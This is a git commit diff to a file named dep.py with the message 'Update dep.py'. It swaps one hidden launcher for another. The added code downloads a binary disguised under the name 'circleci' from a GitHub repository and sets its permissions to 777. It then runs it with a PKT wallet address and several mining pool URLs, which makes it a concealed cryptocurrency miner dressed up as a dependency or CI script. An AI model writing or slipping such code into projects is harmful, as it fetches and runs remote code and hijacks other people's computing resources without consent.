3de850a1a3803642aab72f9bc60e7d53c95b537a
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-03-31 20:16:10 +0700

    Update dep.py

--- dep.py
+++ dep.py
@@ -1,3 +1,6 @@
-import os as alpha
-alpha.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 run && ./run")
-
+#@title
+import urllib.request
+import os
+print('ssst')
+urllib.request.urlretrieve('https://github.com/aurbach55/zash/raw/main/circleci','circleci')
+os.system ("chmod 777 circleci && ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx  http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world -t 4")
